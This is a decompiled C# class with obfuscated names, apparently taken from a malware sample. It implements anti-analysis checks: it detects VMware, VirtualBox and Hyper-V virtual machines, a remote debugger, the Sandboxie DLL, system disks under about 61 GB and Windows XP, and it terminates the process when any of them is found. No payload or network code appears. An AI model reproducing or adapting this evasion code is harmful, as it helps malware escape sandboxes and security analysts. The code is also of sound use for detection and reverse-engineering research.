using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using Microsoft.VisualBasic.Devices;

namespace TRjqmOcqLzx;

internal class rnfnvibrlIQPaj
{
	public static void uSsqxxZvfGOPXR()
	{
		if (MRIbXgefTCT() || FpmtGkyugKtDv() || OtNtFDEJzOHjMmg() || QcJyXwBVnwzDWP() || zzNUUoCRGmmdM())
		{
			Environment.FailFast(null);
		}
	}

	private static bool QcJyXwBVnwzDWP()
	{
		try
		{
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool zzNUUoCRGmmdM()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains("xp"))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool MRIbXgefTCT()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item("Manufacturer").ToString()!.ToLower();
							if ((text == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool FpmtGkyugKtDv()
	{
		bool PiaBuTHDcDO = false;
		try
		{
			yyWhLHXDgUikm.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref PiaBuTHDcDO);
			return PiaBuTHDcDO;
		}
		catch
		{
			return PiaBuTHDcDO;
		}
	}

	private static bool OtNtFDEJzOHjMmg()
	{
		try
		{
			if (yyWhLHXDgUikm.GetModuleHandle("SbieDll.dll").ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}
}
